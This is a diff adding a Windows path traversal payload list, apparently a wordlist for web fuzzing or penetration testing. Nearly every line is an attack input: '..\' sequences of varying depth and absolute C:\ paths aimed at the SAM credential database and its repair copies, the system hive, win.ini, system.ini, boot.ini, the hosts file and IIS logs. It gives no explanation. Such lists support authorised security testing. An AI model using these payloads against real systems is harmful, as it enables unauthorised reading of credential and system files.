@@ -1,0 +1,32 @@
+# Path Traversal - Windows
+# Payloads targeting sensitive files on Windows systems
+..\windows\system32\config\sam
+..\..\windows\system32\config\sam
+..\..\..\windows\system32\config\sam
+..\..\..\..\windows\system32\config\sam
+..\..\..\..\..\windows\system32\config\sam
+..\windows\win.ini
+..\..\windows\win.ini
+..\..\..\windows\win.ini
+..\..\..\..\windows\win.ini
+..\windows\system.ini
+..\..\windows\system.ini
+..\..\..\windows\system.ini
+..\boot.ini
+..\..\boot.ini
+..\..\..\boot.ini
+..\windows\system32\drivers\etc\hosts
+..\..\windows\system32\drivers\etc\hosts
+..\..\..\windows\system32\drivers\etc\hosts
+..\..\..\..\windows\system32\drivers\etc\hosts
+..\windows\repair\sam
+..\..\windows\repair\sam
+..\windows\repair\system
+..\..\windows\repair\system
+..\inetpub\logs\logfiles
+..\..\inetpub\logs\logfiles
+C:\windows\win.ini
+C:\windows\system.ini
+C:\boot.ini
+C:\windows\system32\config\sam
+C:\windows\system32\drivers\etc\hosts
